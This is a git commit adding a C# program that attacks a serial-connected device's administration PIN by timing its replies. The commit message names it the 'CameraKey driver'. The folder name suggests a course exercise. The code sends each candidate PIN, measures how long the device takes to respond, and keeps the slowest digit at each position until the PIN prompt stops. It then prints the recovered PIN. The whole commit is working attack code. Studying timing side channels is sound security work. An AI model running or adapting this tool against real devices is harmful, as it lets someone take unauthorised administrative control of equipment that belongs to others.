3a40f796f302b4a1f406b299f8b0685a41f1f036
Hakan Yıldızhan <yildizhanhakan@outlook.com>
2023-01-30 02:50:34 +0100

    CameraKey driver PIN timing attacker

---
+++ List4/TimingAttack/Program.cs
@@ -0,0 +1,48 @@
+﻿using System.IO.Ports;
+
+namespace TimingAttack
+{
+    internal class Program
+    {
+        private static SerialPort port;
+        private static TimingManager timingAttacker = new TimingManager();
+
+        static void Main(string[] args)
+        {
+            Console.Write("Enter port number: ");
+            var portNumber = Convert.ToInt32(Console.ReadLine());
+            
+            port = new SerialPort($"COM{portNumber}",
+                9600, Parity.None, 8, StopBits.One);
+            
+            port.DataReceived += new SerialDataReceivedEventHandler(port_DataReceived);
+
+            port.Open();
+
+            while (port.IsOpen)
+            {
+                var message = timingAttacker.GetNext();
+                Console.WriteLine($"Trying PIN {message}");
+                timingAttacker.StartTiming();
+                port.WriteLine(message);
+                Thread.Sleep(TimeSpan.FromSeconds(1));
+            }
+            
+            Console.WriteLine("Enter any key to exit..");
+            Console.ReadLine();
+            Environment.Exit(0);
+        }
+        
+        private static void port_DataReceived(object sender, SerialDataReceivedEventArgs e)
+        {
+            var receivedMessage = port.ReadExisting();
+            if (!receivedMessage.StartsWith("Enter administration PIN"))
+            {
+                Console.WriteLine($"Found PIN: {timingAttacker.GetCurrentPIN()}");
+                port.Close();
+                return;
+            }
+            timingAttacker.Received(receivedMessage);
+        }
+    }
+}
---
+++ List4/TimingAttack/TimingManager.cs
@@ -0,0 +1,71 @@
+﻿using System.Diagnostics;
+
+namespace TimingAttack;
+
+public class TimingManager
+{
+    private readonly Stopwatch _stopwatch = new Stopwatch();
+    private int _nextDigit = 0;
+    private string _correctDigits;
+    private static int PIN_DIGITS = 3;
+    private readonly Dictionary<int, long> _digitTimings;
+        
+    public TimingManager()
+    {
+        _correctDigits = string.Empty;
+        _digitTimings = new Dictionary<int, long>();
+    }
+
+    public void StartTiming()
+    {
+        _stopwatch.Start();
+    }
+    
+    public void Received(string message)
+    {
+        StopTiming();
+        _digitTimings.Add(_nextDigit, _stopwatch.ElapsedMilliseconds);
+        ResetTiming();
+        _nextDigit++;
+        
+        if (_nextDigit == 10)
+        {
+            int correctIndex = FindCorrectIndex(_digitTimings.Values.ToList());
+            _correctDigits += correctIndex;
+            _digitTimings.Clear();
+            _nextDigit = 0;
+            
+            if (_correctDigits.Length == PIN_DIGITS)
+            {
+                PIN_DIGITS++;
+            }
+        }
+    }
+
+    public string GetNext()
+    {
+        return _correctDigits 
+               + (_nextDigit)
+               + new string('0', PIN_DIGITS - _correctDigits.Length - 1);
+    }
+
+    public string GetCurrentPIN()
+    {
+        return _correctDigits + _nextDigit;
+    }
+
+    private static int FindCorrectIndex(IList<long> timings)
+    {
+        return timings.IndexOf(timings.MaxBy(t => t));
+    }
+
+    private void StopTiming()
+    {
+        _stopwatch.Stop();
+    }
+    
+    private void ResetTiming()
+    {
+        _stopwatch.Reset();
+    }
+}
